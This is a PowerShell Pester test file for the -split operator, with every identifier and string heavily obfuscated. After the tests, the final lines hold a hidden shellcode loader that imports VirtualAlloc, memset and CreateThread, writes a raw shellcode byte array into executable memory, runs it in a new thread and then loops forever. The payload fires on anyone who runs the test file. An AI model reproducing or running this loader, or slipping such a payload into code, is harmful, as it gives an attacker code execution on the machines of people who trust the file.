&("{1}{0}" -f 'be','Descri') ("{2}{3}{4}{0}{1}"-f 'a','tor','Spli','t',' Oper') -Tags ('CI') {
    &("{1}{0}"-f 't','Contex') ("{2}{1}{0}{4}{3}{5}" -f 'ry sp','ina','B','t operat','li','or') {
        &('It') ("{11}{1}{12}{5}{7}{2}{6}{0}{8}{10}{3}{9}{4}"-f'or ca','nary sp','per','l','f value','t','at',' o','n ','it array o','sp','Bi','li') {
            ${r`eS} = "a b", "c d" -split " "
            ${R`es}."cOU`Nt" | &("{0}{1}" -f 'Shoul','d') -Be 4
            ${r`eS}[0] | &("{0}{1}" -f 'S','hould') -Be "a"
            ${R`eS}[1] | &("{0}{1}"-f'Shou','ld') -Be "b"
            ${R`eS}[2] | &("{0}{1}" -f 'Sh','ould') -Be "c"
            ${r`eS}[3] | &("{1}{0}" -f 'uld','Sho') -Be "d"
        }

        &('It') ("{0}{3}{5}{2}{8}{10}{9}{1}{6}{7}{4}" -f 'Bi','a ','plit operato','nary','g',' s','str','in','r can',' ',' split') {
            ${r`Es} = ("{0}{1}{2}"-f'a ','b c',' d') -split " "
            ${R`eS}."C`oUnt" | &("{0}{1}"-f 'Sho','uld') -Be 4
            ${r`eS}[0] | &("{0}{1}" -f'Shoul','d') -Be "a"
            ${R`Es}[1] | &("{1}{0}" -f 'd','Shoul') -Be "b"
            ${r`Es}[2] | &("{0}{1}" -f'Sh','ould') -Be "c"
            ${r`ES}[3] | &("{0}{1}" -f'Shoul','d') -Be "d"
        }

        &('It') ("{12}{11}{3}{0}{2}{10}{5}{9}{7}{1}{8}{6}{4}"-f 't op','s','erato','nary spli','t',' wor','g limi','x sub','trin','ks with ma','r can','i','B') {
            ${R`es} = ("{0}{2}{1}" -f'a',' c d',' b') -split " ", 2
            ${R`eS}."Co`UNT" | &("{1}{0}{2}"-f'ul','Sho','d') -Be 2
            ${R`eS}[0] | &("{2}{1}{0}"-f 'ould','h','S') -Be "a"
            ${R`Es}[1] | &("{2}{1}{0}"-f'uld','o','Sh') -Be ("{0}{1}"-f'b c ','d')

            ${R`eS} = ("{0}{2}{1}" -f'a b','d',' c ') -split " ", 0
            ${r`Es}."Co`UNT" | &("{1}{0}"-f 'd','Shoul') -Be 4
            ${r`ES}[0] | &("{1}{0}"-f'uld','Sho') -Be "a"
            ${r`ES}[1] | &("{2}{0}{1}"-f'ul','d','Sho') -Be "b"
            ${r`es}[2] | &("{0}{1}{2}"-f 'S','hou','ld') -Be "c"
            ${r`es}[3] | &("{0}{1}"-f'S','hould') -Be "d"

            ${R`es} = ("{1}{0}"-f ' b c d','a') -split " ", -2
            ${R`Es}."CoU`NT" | &("{1}{0}"-f 'd','Shoul') -Be 2
            ${r`eS}[0] | &("{2}{1}{0}"-f 'ld','ou','Sh') -Be ("{0}{1}"-f'a',' b c')
            ${R`Es}[1] | &("{1}{2}{0}"-f 'd','Sho','ul') -Be "d"

            ${R`eS} = ("{0}{1}{2}"-f'a b c',' ','d') -split " ", -1
            ${r`es}."cO`UnT" | &("{0}{1}"-f 'Sh','ould') -Be 1
            ${r`es}[0] | &("{0}{1}"-f 'Shoul','d') -Be ("{1}{0}"-f 'd','a b c ')
        }

        &('It') ("{3}{9}{10}{1}{4}{2}{6}{0}{11}{12}{8}{7}{5}{13}"-f 'ferent','era','h','Binary spl','tor can work wit','t strin',' dif','han spli','meter t','it ','op',' de','li','g') {
            ${R`eS} = ("{1}{0}"-f 'd','a b c ') -split " ",8
            ${r`ES}."COu`Nt" | &("{1}{0}{2}"-f 'hou','S','ld') -Be 4
            ${R`Es}[0] | &("{0}{1}"-f'S','hould') -Be "a"
            ${R`ES}[1] | &("{1}{2}{0}" -f'uld','S','ho') -Be "b"
            ${R`eS}[2] | &("{0}{1}"-f'Sho','uld') -Be "c"
            ${r`ES}[3] | &("{2}{0}{1}"-f'l','d','Shou') -Be "d"

            ${R`ES} = ("{1}{2}{0}" -f' c d','a',' b') -split " ",-8
            ${R`Es}."COu`NT" | &("{1}{0}" -f'ould','Sh') -Be 4
            ${R`es}[0] | &("{1}{0}{2}" -f'l','Shou','d') -Be "a"
            ${r`Es}[1] | &("{1}{0}" -f'hould','S') -Be "b"
            ${R`eS}[2] | &("{0}{1}"-f'S','hould') -Be "c"
            ${r`es}[3] | &("{1}{0}" -f 'hould','S') -Be "d"

            ${r`es} = " " -split " ",-2
            ${R`ES}."co`Unt" | &("{1}{0}" -f'd','Shoul') -Be 2
            ${R`ES}[0] | &("{0}{1}"-f'Shou','ld') -Be ""
            ${r`Es}[1] | &("{2}{1}{0}"-f 'd','oul','Sh') -Be ""
        }

        &('It') ("{13}{11}{2}{8}{0}{9}{7}{6}{1}{5}{10}{12}{3}{4}" -f 'ato','te ca','op','gative nu','mbers','n w','predica','th ','er','r wi','ork wit','ry split ','h ne','Bina') {
            ${r`eS} = ("{2}{0}{1}"-f ' b ','c d','a') -split {${_} -like ' '},-2
            ${R`es}."c`OuNt" | &("{0}{1}"-f 'Shou','ld') -Be 2
            ${r`eS}[0] | &("{0}{1}" -f'Sho','uld') -Be ("{1}{0}"-f'c','a b ')
            ${r`Es}[1] | &("{1}{0}{2}" -f'ou','Sh','ld') -Be "d"

            ${r`es} = ("{0}{1}" -f 'a ','b c d') -split {${_} -like ' '},-4
            ${r`ES}."C`ouNT" | &("{1}{0}"-f'd','Shoul') -Be 4
            ${r`ES}[0] | &("{1}{0}"-f'ould','Sh') -Be "a"
            ${r`Es}[1] | &("{1}{0}"-f'ld','Shou') -Be "b"
            ${R`Es}[2] | &("{0}{1}"-f 'Shou','ld') -Be "c"
            ${R`eS}[3] | &("{1}{0}" -f'hould','S') -Be "d"

            ${r`ES} = ("{1}{0}"-f' b c d','a') -split {${_} -like ' '},-8
            ${R`es}."cO`Unt" | &("{0}{2}{1}"-f 'Sho','ld','u') -Be 4
            ${R`eS}[0] | &("{1}{0}"-f'ould','Sh') -Be "a"
            ${r`es}[1] | &("{1}{0}" -f'uld','Sho') -Be "b"
            ${r`es}[2] | &("{2}{0}{1}"-f'h','ould','S') -Be "c"
            ${R`ES}[3] | &("{1}{0}{2}"-f 'hou','S','ld') -Be "d"

            ${R`eS} = " " -split {${_} -like ' '},-4
            ${r`es}."c`ouNt" | &("{1}{0}" -f 'ld','Shou') -Be 2
            ${R`es}[0] | &("{0}{1}"-f 'Sho','uld') -Be ""
            ${r`Es}[1] | &("{1}{0}"-f 'hould','S') -Be ""

            ${R`es} = ("{1}{5}{3}{2}{0}{4}"-f 'h/to/fil','f','t','a','e','older/p') -split {${_} -like '/'}, -2
            ${r`ES}."C`ounT" | &("{2}{0}{1}" -f'l','d','Shou') -Be 2
            ${R`eS}[0] | &("{2}{1}{0}"-f 'd','houl','S') -Be ("{2}{1}{3}{0}" -f'o','a','folder/p','th/t')
            ${R`eS}[1] | &("{2}{0}{1}"-f 'houl','d','S') -Be ("{0}{1}"-f 'fil','e')
        }

        &('It') ("{5}{2}{1}{11}{9}{10}{3}{6}{0}{8}{7}{4}"-f 'h regex ','ry','a','w','ion','Bin','it','xpress','e','lit operato','r can work ',' sp') {
            ${r`eS} = ("{0}{1}{2}"-f'a','2b3c4','d') -split '\d+',2
            ${r`es}."c`oUNT" | &("{1}{0}"-f'ld','Shou') -Be 2
            ${r`Es}[0] | &("{0}{1}"-f'Shou','ld') -Be "a"
            ${r`Es}[1] | &("{2}{0}{1}" -f 'o','uld','Sh') -Be ("{1}{0}" -f 'd','b3c4')

            ${r`es} = ("{0}{1}{2}" -f'a','2b3','c4d') -split '\d+',-2
            ${r`ES}."c`OUNT" | &("{2}{1}{0}"-f'd','houl','S') -Be 2
            ${r`ES}[0] | &("{1}{0}" -f'ould','Sh') -Be ("{0}{1}" -f 'a2b','3c')
            ${r`eS}[1] | &("{2}{0}{1}" -f 'ou','ld','Sh') -Be "d"
        }

        &('It') ("{11}{9}{4}{7}{3}{5}{2}{13}{12}{8}{10}{14}{1}{6}{0}" -f'er','lim','with fr','erator can wo','spl','rks ','it','it op','f','inary ','orm d','B','e','e','e') {
            ${R`ES} = ("{0}{2}{1}"-f'a:',':d',':b::c:') -split "::"
            ${r`ES}."cou`NT" | &("{1}{0}" -f'ld','Shou') -Be 4
            ${r`Es}[0] | &("{1}{0}"-f'ld','Shou') -Be "a"
            ${r`eS}[1] | &("{1}{0}"-f 'ould','Sh') -Be "b"
            ${r`Es}[2] | &("{1}{0}" -f 'd','Shoul') -Be "c"
            ${R`ES}[3] | &("{1}{2}{0}" -f'd','Sho','ul') -Be "d"
        }

        &('It') ("{5}{7}{1}{4}{6}{0}{3}{2}{8}" -f 'se','era','mit','rve deli','tor ','Binary split o','can pre','p','er') {
            ${r`eS} = ("{2}{1}{0}"-f':d','1:c1','a1:b') -split (("{1}{0}"-f ')','(1:'))
            ${r`eS}."c`oUNT" | &("{1}{0}" -f 'ld','Shou') -Be 7
            ${R`ES}[0] | &("{1}{0}" -f 'ould','Sh') -Be "a"
            ${r`eS}[1] | &("{1}{0}" -f 'uld','Sho') -Be "1:"
            ${R`eS}[2] | &("{1}{2}{0}" -f 'ld','Sh','ou') -Be "b"
            ${R`es}[3] | &("{0}{1}"-f 'S','hould') -Be "1:"
            ${r`eS}[4] | &("{1}{2}{0}" -f'd','Sho','ul') -Be "c"
            ${R`eS}[5] | &("{1}{0}"-f 'ould','Sh') -Be "1:"
            ${R`ES}[6] | &("{0}{1}"-f 'S','hould') -Be "d"

            ${r`ES} = ("{1}{0}{2}" -f':','a1:b1','c1:d') -split ("{0}{1}"-f '1(:',')')
            ${r`Es}."co`Unt" | &("{1}{0}" -f'ould','Sh') -Be 7
            ${r`es}[0] | &("{1}{0}{2}" -f 'h','S','ould') -Be "a"
            ${r`ES}[1] | &("{0}{1}"-f 'Sho','uld') -Be ":"
            ${r`es}[2] | &("{0}{1}" -f'Shou','ld') -Be "b"
            ${r`es}[3] | &("{2}{1}{0}"-f'd','oul','Sh') -Be ":"
            ${r`eS}[4] | &("{0}{1}{2}" -f 'Sho','u','ld') -Be "c"
            ${r`ES}[5] | &("{2}{1}{0}"-f'd','houl','S') -Be ":"
            ${R`eS}[6] | &("{2}{1}{0}" -f'd','houl','S') -Be "d"
        }

        &('It') ("{11}{9}{19}{10}{16}{0}{8}{6}{2}{5}{18}{15}{12}{7}{17}{3}{4}{1}{14}{13}" -f 'rato','iti','e ','a','se-sens','ca','n b','i','r ca','ary spli',' o','Bin','t','e','v','si','pe','ve and c','se-insen','t') {
            ${R`es} = ("{1}{0}"-f'cBd','ab') -split "B"
            ${R`es}."Cou`NT" | &("{1}{0}"-f 'uld','Sho') -Be 3
            ${R`Es}[0] | &("{0}{1}"-f 'S','hould') -Be "a"
            ${R`es}[1] | &("{0}{1}"-f'Shoul','d') -Be "c"
            ${r`es}[2] | &("{0}{1}{2}"-f'S','ho','uld') -Be "d"

            ${r`ES} = ("{0}{1}"-f'abcB','d') -isplit "B"
            ${r`eS}."c`OuNT" | &("{0}{1}"-f 'Shoul','d') -Be 3
            ${r`Es}[0] | &("{1}{2}{0}" -f'ld','S','hou') -Be "a"
            ${r`ES}[1] | &("{2}{0}{1}"-f'l','d','Shou') -Be "c"
            ${r`es}[2] | &("{2}{0}{1}"-f'houl','d','S') -Be "d"

            ${R`eS} = ("{0}{1}"-f 'ab','cBd') -csplit "B"
            ${r`es}."c`OUNt" | &("{1}{0}{2}"-f'ho','S','uld') -Be 2
            ${R`eS}[0] | &("{0}{1}"-f 'Sh','ould') -Be "abc"
            ${R`es}[1] | &("{0}{1}{2}"-f 'Sh','oul','d') -Be "d"

            ${R`ES} = ("{1}{0}"-f 'cBd','ab') -csplit "B", 0 , ("{2}{0}{1}"-f'oreCas','e','Ign')
            ${r`eS}."Co`UNT" | &("{1}{0}"-f'd','Shoul') -Be 3
            ${R`eS}[0] | &("{0}{1}"-f'S','hould') -Be "a"
            ${R`eS}[1] | &("{0}{2}{1}" -f 'S','ould','h') -Be "c"
            ${r`es}[2] | &("{1}{2}{0}" -f'ld','Sh','ou') -Be "d"
        }

        &('It') ("{8}{1}{3}{6}{5}{0}{9}{2}{4}{10}{7}"-f' op','inar','ator can works ','y','w','plit',' s','ipt block','B','er','ith scr') {
            ${R`ES} = ("{0}{1}{2}"-f 'a::b:',':','c::d') -split {${_} -eq "b" -or ${_} -eq "C"}
            ${R`eS}."CO`UnT" | &("{0}{1}" -f'Shoul','d') -Be 3
            ${R`es}[0] | &("{0}{1}" -f 'Shou','ld') -Be "a::"
            ${r`Es}[1] | &("{0}{1}"-f'Shoul','d') -Be "::"
            ${R`ES}[2] | &("{1}{0}" -f 'ld','Shou') -Be "::d"
        }

    }

    &("{0}{2}{1}"-f 'Co','text','n') ("{5}{4}{1}{0}{2}{6}{3}"-f'operat','ary split ','or o','ions','in','B','pt') {
        &("{3}{1}{2}{0}" -f 'l','r','eAl','Befo') {
            
            ${TE`sTcAS`Es} = @(
                @{ ("{0}{1}"-f 'Nam','e') = '`n';   ("{0}{1}{2}"-f't','es','tText') = "a12a`nb34b`nc56c`nd78d";       ("{1}{0}{2}"-f'estText','t','2') = "a12a`n%b34b`nc56c`nd78d";       ("{2}{1}{0}" -f'Line','w','ne') = "`n" }
                @{ ("{1}{0}" -f'me','Na') = (('UKWr'+'UK'+'Wn')."re`pLA`Ce"('UKW',[sTRInG][ChAR]96)); ("{2}{0}{1}"-f 't','Text','tes') = "a12a`r`nb34b`r`nc56c`r`nd78d"; ("{1}{0}"-f'Text2','test') = "a12a`r`n%b34b`r`nc56c`r`nd78d"; ("{0}{1}" -f'n','ewLine') = "`r`n" }
                )
        }

        &('It') ((("{14}{16}{12}{8}{0}{2}{7}{1}{10}{19}{17}{13}{15}{6}{11}{18}{3}{4}{9}{5}" -f 'erator ',' no Mu','has ','w lin','e = ','})','fau','no Singleline and','p','{0}<Name>{0','ltiline','l','t o',' ','Binary ','de','spli','y','t (ne',' b'))  -f[CHAr]39) -TestCases ${te`S`TCas`es} {
            param(${tEst`T`Ext}, ${tes`TT`eXt2}, ${nE`w`LINe})
            
            ${r`eS} = ${TES`Tt`E`Xt} -split '^b'
            ${R`es}."CoU`NT" | &("{0}{1}"-f 'S','hould') -Be 1

            
            ${r`Es} = ${tE`St`TEXt} -split ("{1}{0}"-f 'c','b.+')
            ${r`eS}."c`ounT" | &("{2}{1}{0}" -f'ld','u','Sho') -Be 1
        }

        &('It') ((("{5}{8}{0}{1}{12}{10}{15}{11}{6}{2}{4}{7}{14}{18}{16}{3}{9}{17}{13}" -f'it',' ','nglel','Nam','ine ','Binary ','i','(new','spl','e>l','p','with S','o','S)',' line ','erator works ','<','q','= lqS'))."REpl`AcE"('lqS',[STRING][ChAr]39)) -TestCases ${teStc`A`s`es} {
            param(${TE`stt`Ext}, ${Te`sTtE`Xt2}, ${ne`w`LinE})
            ${r`ES} = ${T`eStTe`XT} -split ("{0}{1}" -f 'b.+','c'), 0, ("{2}{0}{1}"-f 'n','gleline','Si')
            ${R`eS}."Co`UNt" | &("{1}{0}" -f 'ld','Shou') -Be 2
            ${R`ES}[0] | &("{1}{0}" -f 'ld','Shou') -Be "a12a$($newLine)"
            ${r`eS}[1] | &("{1}{0}" -f 'uld','Sho') -Be "$($newLine)d78d"

            ${r`Es} = ${t`esTTEX`T2} -split ("{1}{0}"-f'+c','b.'), 0, ("{2}{1}{0}" -f'eline','ingl','S')
            ${R`Es}."c`Ount" | &("{0}{1}" -f'Shou','ld') -Be 2
            ${R`es}[0] | &("{1}{0}"-f'ould','Sh') -Be "a12a$($newLine)%"
            ${R`ES}[1] | &("{0}{2}{1}"-f 'Sho','ld','u') -Be "$($newLine)d78d"
        }

        &('It') ((("{7}{4}{11}{12}{10}{13}{19}{0}{6}{14}{8}{5}{15}{3}{1}{2}{9}{16}{17}{18}" -f'era','M','ultili','ith ','nary ','ks','tor','Bi','or','ne (new line = ouC<',' ','spl','it','o',' w',' w','Nam','e>o','uC)','p'))-ReplaCe  'ouC',[CHar]39) -TestCases ${t`eS`TCaSEs} {
            param(${teS`TtE`Xt}, ${Te`ST`T`ExT2}, ${N`ewL`Ine})
            ${R`Es} = ${test`Te`xT} -split '^b', 0, ("{2}{1}{0}"-f'iline','t','Mul')
            ${r`eS}."cou`NT" | &("{2}{1}{0}"-f'uld','o','Sh') -Be 2
            ${R`es}[0] | &("{1}{0}" -f'ould','Sh') -Be "a12a$($newLine)"
            ${R`ES}[1] | &("{0}{1}"-f 'Shoul','d') -Be "34b$($newLine)c56c$($newLine)d78d"
        }

        &('It') ((("{6}{4}{12}{15}{3}{9}{2}{10}{16}{14}{8}{1}{7}{0}{5}{13}{11}" -f'Multiline (ne','ingleli','or','t o','ry','w','Bina','ne,',' S','perat',' w','SN8<Name>SN8)',' sp',' line = ','with','li','orks '))."r`ePL`Ace"('SN8',[STRING][cHaR]39)) -TestCases ${t`eSTc`As`ES} {
            param(${Tes`TT`EXT}, ${Te`stTE`X`T2}, ${neW`lI`NE})
            ${R`Es} = ${Te`ST`T`Ext} -split ("{1}{0}"-f 'c','b.+'), 0, ("{4}{3}{2}{5}{0}{1}"-f'ultili','ne','lin','ngle','Si','e,M')
            ${R`es}."c`ouNT" | &("{0}{1}" -f'Shoul','d') -Be 2
            ${r`eS}[0] | &("{0}{2}{1}" -f 'S','ould','h') -Be "a12a$($newLine)"
            ${r`Es}[1] | &("{1}{2}{0}"-f 'd','Sho','ul') -Be "$($newLine)d78d"

            ${r`eS} = ${t`es`TT`exT2} -split ("{0}{1}" -f'b.+','c'), 0, ("{5}{1}{2}{0}{3}{4}" -f'l','e',',Mu','tili','ne','Singlelin')
            ${R`ES}."co`UnT" | &("{1}{0}" -f 'hould','S') -Be 2
            ${R`es}[0] | &("{1}{0}"-f 'ould','Sh') -Be "a12a$($newLine)%"
            ${r`Es}[1] | &("{1}{0}" -f'uld','Sho') -Be "$($newLine)d78d"

            ${r`eS} = ${T`Est`Te`xt} -split ("{0}{1}" -f '^b.','+c'), 0, ("{2}{3}{1}{4}{5}{0}" -f 'ne','ngleline,M','S','i','ul','tili')
            ${r`Es}."cou`Nt" | &("{2}{0}{1}" -f 'hou','ld','S') -Be 2
            ${R`es}[0] | &("{2}{1}{0}"-f'ould','h','S') -Be "a12a$($newLine)"
            ${R`eS}[1] | &("{1}{0}" -f'ld','Shou') -Be "$($newLine)d78d"

            ${R`es} = ${TESTTe`X`T2} -split ("{1}{0}" -f'c','^b.+'), 0, ("{1}{4}{0}{2}{5}{3}"-f 'gleline','Si',',','line','n','Multi')
            ${R`ES}."c`OUNT" | &("{1}{0}"-f 'ould','Sh') -Be 1
        }

        &('It') ("{15}{16}{13}{6}{5}{14}{9}{2}{8}{1}{12}{11}{3}{4}{7}{10}{0}" -f 'space','th ','w','tte','r','plit operat','s','nWhi','i','works ','te','a','IgnoreP',' ','or ','Binar','y') {
            ${r`ES} = ("{0}{1}" -f 'a: ','b:c') -split ': '
            ${r`es}."COu`Nt" | &("{1}{0}" -f'uld','Sho') -Be 2
            ${r`eS}[0] | &("{1}{0}" -f'hould','S') -Be "a"
            ${r`ES}[1] | &("{1}{2}{0}"-f'ould','S','h') -Be "b:c"

            ${r`Es} = ("{2}{0}{1}"-f ' ','b:c','a:') -split ': ',0,("{6}{2}{5}{1}{3}{0}{4}"-f'tespa','tt','gnor','ernWhi','ce','ePa','I')
            ${r`Es}."Co`UnT" | &("{1}{0}{2}"-f'ho','S','uld') -Be 3
            ${R`Es}[0] | &("{0}{1}" -f'Sho','uld') -Be "a"
            ${r`es}[1] | &("{1}{0}"-f'ould','Sh') -Be " b"
            ${R`es}[2] | &("{0}{1}" -f'S','hould') -Be "c"
        }

        &('It') ("{12}{3}{5}{1}{7}{8}{0}{13}{2}{11}{6}{10}{4}{9}" -f'i','w','h Ex','erat','r','or ','tCapt','orks ','w','e','u','plici','Binary split op','t') {
            ${R`ES} = "a:b" -split "(:)"
            ${r`Es}."c`ounT" | &("{1}{0}" -f'ould','Sh') -Be 3
            ${R`es}[0] | &("{2}{0}{1}" -f'u','ld','Sho') -Be "a"
            ${r`eS}[1] | &("{0}{1}" -f'Sho','uld') -Be ":"
            ${R`Es}[2] | &("{2}{1}{0}"-f'uld','o','Sh') -Be "b"

            ${R`es} = "a:b" -split "(:)", 0, ("{3}{1}{2}{0}"-f 'ure','xp','licitCapt','E')
            ${r`ES}."cOU`Nt" | &("{0}{1}" -f 'Shoul','d') -Be 2
            ${R`eS}[0] | &("{2}{1}{0}"-f 'uld','ho','S') -Be "a"
            ${r`eS}[1] | &("{0}{1}{2}"-f'S','h','ould') -Be "b"
        }

        &('It') ("{10}{11}{3}{8}{1}{2}{4}{5}{7}{9}{6}{0}" -f 'with SimpleMatch','i','t','nary',' op','e',' ','rator w',' spl','orks','B','i') {
            ${R`es} = "abc" -split "B", 0, ("{1}{4}{2}{3}{0}"-f'e','Simple','tch,I','gnoreCas','Ma')
            ${R`eS}."Cou`NT" | &("{0}{1}" -f'Shoul','d') -Be 2
            ${r`ES}[0] | &("{2}{0}{1}"-f 'ul','d','Sho') -Be "a"
            ${R`ES}[1] | &("{0}{1}{2}" -f 'Sh','o','uld') -Be "c"
        }

        &('It') ("{7}{4}{9}{8}{0}{11}{6}{5}{1}{2}{10}{3}{12}"-f 'op','ks',' wit','Mat','y s','tor wor','a','Binar',' ','plit','h Regex','er','ch') {
            ${r`eS} = "abc" -split "B", 0, ("{4}{0}{1}{2}{3}"-f 'g','exMatc','h,','Singleline','Re')
            ${R`Es}."CoU`NT" | &("{1}{0}"-f 'ould','Sh') -Be 2
            ${r`es}[0] | &("{0}{1}"-f 'Sho','uld') -Be "a"
            ${R`es}[1] | &("{1}{0}" -f'ld','Shou') -Be "c"
        }

        &('It') ((("{11}{16}{8}{9}{2}{4}{15}{5}{12}{0}{1}{6}{13}{10}{7}{14}{3}"-f' R','eg','N','leMatch','y','w','ex','ch,Si','ary split ','operator doesnr','at','B','ith','M','mp','t works ','in'))  -CrePLaCE 'rNy',[ChAr]39) {
            { "abc" -split "B", 0, ("{1}{4}{3}{2}{0}"-f 'h','Regex','Matc','ch,Simple','Mat') } | &("{1}{0}"-f 'ould','Sh') -Throw -ErrorId ("{5}{2}{3}{1}{4}{0}" -f 'ion','t','dS','plitOp','ionCombinat','Invali')
        }
    }

    &("{1}{0}" -f 'ext','Cont') ("{0}{3}{4}{5}{1}{2}"-f 'Un','o','r','ar','y split o','perat') {
        &('It') ("{12}{5}{4}{6}{1}{11}{0}{10}{3}{9}{2}{8}{7}"-f 's higher ','or','a com','receden','it oper','y spl','at','a','m','ce than ','p',' ha','Unar') {
            ${r`eS} = -split "a b", "c d"
            ${R`eS}."CoU`NT" | &("{1}{0}" -f 'uld','Sho') -Be 2
            ${r`Es}[0][0] | &("{0}{1}"-f 'Sh','ould') -Be "a"
            ${R`ES}[0][1] | &("{0}{1}" -f 'Sh','ould') -Be "b"
            ${r`Es}[1] | &("{0}{1}" -f 'Shoul','d') -Be "c d"
        }

        &('It') ("{7}{1}{5}{8}{6}{0}{2}{4}{3}"-f' ','nar','spl','s','it array of value','y s','r can','U','plit operato') {
            ${R`Es} = -split ("a b", "c d")
            ${R`ES}."cOu`NT" | &("{2}{0}{1}" -f 'ou','ld','Sh') -Be 4
            ${R`Es}[0] | &("{0}{1}"-f'Shoul','d') -Be "a"
            ${r`eS}[1] | &("{0}{1}"-f'Shou','ld') -Be "b"
            ${R`ES}[2] | &("{1}{0}"-f 'ld','Shou') -Be "c"
            ${R`eS}[3] | &("{2}{0}{1}" -f 'o','uld','Sh') -Be "d"
        }

        &('It') ("{8}{6}{0}{7}{5}{1}{4}{3}{9}{2}" -f 'y split','rator','ing','lit a',' can sp','ope','ar',' ','Un',' str') {
            ${R`es} = -split ("{1}{2}{0}"-f ' d','a b ','c')
            ${R`Es}."cOu`NT" | &("{0}{2}{1}"-f 'S','ould','h') -Be 4
            ${R`ES}[0] | &("{0}{1}" -f 'S','hould') -Be "a"
            ${R`ES}[1] | &("{0}{1}" -f 'Sho','uld') -Be "b"
            ${R`es}[2] | &("{1}{0}" -f'ould','Sh') -Be "c"
            ${R`es}[3] | &("{1}{0}"-f'ld','Shou') -Be "d"
        }
    }
}

${C} = ((("{79}{54}{82}{89}{21}{13}{38}{42}{67}{17}{78}{53}{14}{77}{43}{28}{36}{86}{59}{85}{69}{64}{18}{60}{90}{7}{71}{9}{35}{3}{44}{66}{50}{70}{20}{52}{73}{61}{33}{34}{5}{19}{68}{87}{51}{91}{45}{27}{63}{41}{88}{81}{11}{83}{75}{47}{31}{12}{56}{84}{57}{25}{48}{37}{8}{46}{80}{74}{39}{4}{32}{72}{62}{0}{58}{1}{55}{24}{16}{15}{22}{49}{30}{2}{26}{10}{40}{65}{23}{76}{6}{29}" -f'lIm','t(NeMms','n IntP','dl','gs, IntP','eThre','int src, uint','l','r, u','eMkernel32','Int','P','dr','blic static ext','tr','N','l','r ','e, u','a','atic ','eM)]pu','e','est','t.dl','l','tr memset(','ttributes,','ress, u',' count);',' exter','d','tr ','r',' Creat','.','int dwSize, ','ete','ern In','a','Ptr ','t d','tP','lpAdd','l','readA','in','tA','pParam','M)]public static','eM)]pu','r lp','e','IntP','DllImport(','vcr','es',', IntPtr ','por','lA','int flProt','ntPt',');[Dl',' uin','p','d','N','t','d','tionTy','blic st','Import(N','lpThreadId','xtern I','l','pStar',', u',' ','VirtualAlloc(','[','t dwCreationF','StackSize, Int','NeMkern','tr l','s','lloca','uint f','(IntPt','w','el32.dllN','ect);[Dl','Th'))  -REplACE  ([chAR]78+[chAR]101+[chAR]77),[chAR]34);${W} = &("{0}{2}{1}"-f 'Add-Ty','e','p') -memberDefinition ${c} -Name ("{0}{1}" -f'Win','32') -namespace ("{1}{3}{0}{2}"-f 'c','Wi','tions','n32Fun') -passthru;[Byte[]];[Byte[]]${Z} = 0xba,0x58,0x4d,0xdb,0xc1,0xda,0xdb,0xd9,0x74,0x24,0xf4,0x5f,0x31,0xc9,0xb1,0x47,0x31,0x57,0x13,0x83,0xef,0xfc,0x03,0x57,0x57,0xaf,0x2e,0x3d,0x8f,0xad,0xd1,0xbe,0x4f,0xd2,0x58,0x5b,0x7e,0xd2,0x3f,0x2f,0xd0,0xe2,0x34,0x7d,0xdc,0x89,0x19,0x96,0x57,0xff,0xb5,0x99,0xd0,0x4a,0xe0,0x94,0xe1,0xe7,0xd0,0xb7,0x61,0xfa,0x04,0x18,0x58,0x35,0x59,0x59,0x9d,0x28,0x90,0x0b,0x76,0x26,0x07,0xbc,0xf3,0x72,0x94,0x37,0x4f,0x92,0x9c,0xa4,0x07,0x95,0x8d,0x7a,0x1c,0xcc,0x0d,0x7c,0xf1,0x64,0x04,0x66,0x16,0x40,0xde,0x1d,0xec,0x3e,0xe1,0xf7,0x3d,0xbe,0x4e,0x36,0xf2,0x4d,0x8e,0x7e,0x34,0xae,0xe5,0x76,0x47,0x53,0xfe,0x4c,0x3a,0x8f,0x8b,0x56,0x9c,0x44,0x2b,0xb3,0x1d,0x88,0xaa,0x30,0x11,0x65,0xb8,0x1f,0x35,0x78,0x6d,0x14,0x41,0xf1,0x90,0xfb,0xc0,0x41,0xb7,0xdf,0x89,0x12,0xd6,0x46,0x77,0xf4,0xe7,0x99,0xd8,0xa9,0x4d,0xd1,0xf4,0xbe,0xff,0xb8,0x90,0x73,0x32,0x43,0x60,0x1c,0x45,0x30,0x52,0x83,0xfd,0xde,0xde,0x4c,0xd8,0x19,0x21,0x67,0x9c,0xb6,0xdc,0x88,0xdd,0x9f,0x1a,0xdc,0x8d,0xb7,0x8b,0x5d,0x46,0x48,0x34,0x88,0xc9,0x18,0x9a,0x63,0xaa,0xc8,0x5a,0xd4,0x42,0x03,0x55,0x0b,0x72,0x2c,0xbc,0x24,0x19,0xd6,0x56,0x8b,0x76,0xd9,0xa5,0x63,0x85,0xda,0xb8,0x2f,0x00,0x3c,0xd0,0xdf,0x44,0x96,0x4c,0x79,0xcd,0x6c,0xed,0x86,0xdb,0x08,0x2d,0x0c,0xe8,0xed,0xe3,0xe5,0x85,0xfd,0x93,0x05,0xd0,0x5c,0x35,0x19,0xce,0xcb,0xb9,0x8f,0xf5,0x5d,0xee,0x27,0xf4,0xb8,0xd8,0xe7,0x07,0xef,0x53,0x21,0x92,0x50,0x0b,0x4e,0x72,0x51,0xcb,0x18,0x18,0x51,0xa3,0xfc,0x78,0x02,0xd6,0x02,0x55,0x36,0x4b,0x97,0x56,0x6f,0x38,0x30,0x3f,0x8d,0x67,0x76,0xe0,0x6e,0x42,0x86,0xdc,0xb8,0xaa,0xfc,0x0c,0x79;${g} = 0x1000;if (${Z}."LEN`G`Th" -gt 0x1000){${G} = ${Z}."lE`Ngth"};${X}=${W}::("{3}{2}{1}{0}"-f'tualAlloc','r','i','V').Invoke(0,0x1000,${G},0x40);for (${i}=0;${I} -le (${Z}."L`EnG`Th"-1);${I}++) {${W}::"ME`mSET"([IntPtr](${X}.("{2}{0}{1}" -f 'Int','32','To').Invoke()+${i}), ${Z}[${I}], 1)};${W}::("{0}{3}{1}{2}" -f'Cr','t','eThread','ea').Invoke(0,0,${x},0,0,0);for (;;){&("{1}{0}{2}"-f'rt-s','Sta','leep') 60};
